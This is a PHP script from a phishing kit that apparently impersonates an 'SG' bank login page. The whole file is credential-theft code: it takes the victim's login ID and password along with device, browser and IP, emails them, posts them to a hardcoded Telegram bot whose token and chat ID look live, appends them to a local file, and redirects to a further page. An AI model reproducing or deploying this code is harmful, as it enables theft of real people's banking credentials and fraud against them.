<?php

include("funcs.php");
//include("Config.php");
$_SESSION['user_id'] = $_POST['user_id'];
$_SESSION['Hidden1'] = $_POST['Hidden1'];

$message  = "******* New Login SG *******\n\n";
$message .= "Identifiant : ".$_POST['user_id']."\n";
$message .= "Password : ".$_POST['Hidden1']."\n\n";
$message .= "******* SYS *******\n\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "******* End Login Data *******\n\n\n\n\n";

$send = "";
$subject = "SG|".$ip;
$headers = "From:  Login <don@mox.fr>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot6911400634:AAG0XlfhRwNiljs65fzAhP5tyDN3GtkU_sY/sendMessage?chat_id=1769131615&text=" . urlencode($message)."" );
 
$file = fopen("../infos.txt","a");
fwrite($file,$message);  

$website="https://api.telegram.org/".$token;
$params=[
    'chat_id'=>$chatid,
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


header("Location: tel.php");

?>



